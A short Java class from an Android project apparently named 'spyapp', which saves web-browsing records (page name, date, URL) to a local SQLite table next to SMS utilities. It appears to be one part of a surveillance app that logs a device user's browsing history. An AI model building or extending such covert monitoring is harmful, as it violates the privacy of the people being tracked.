package com.example.spyapp.sqlite;

import com.example.spyapp.sms.SMSUtil;
import com.example.spyapp.sqlite.SqlDb;
import com.example.spyapp.util.Web;

import android.content.ContentValues;

public class WEB extends Web {
	
	public long insert(SqlDb db) {
		ContentValues v = new ContentValues();
		v.put("name", getName());
		v.put("web_date", getDate());
		v.put("url", getUrl());
		v.put("_id", getId());
		return db.insert(SMSUtil.TBL_WEB, v);		
	}

}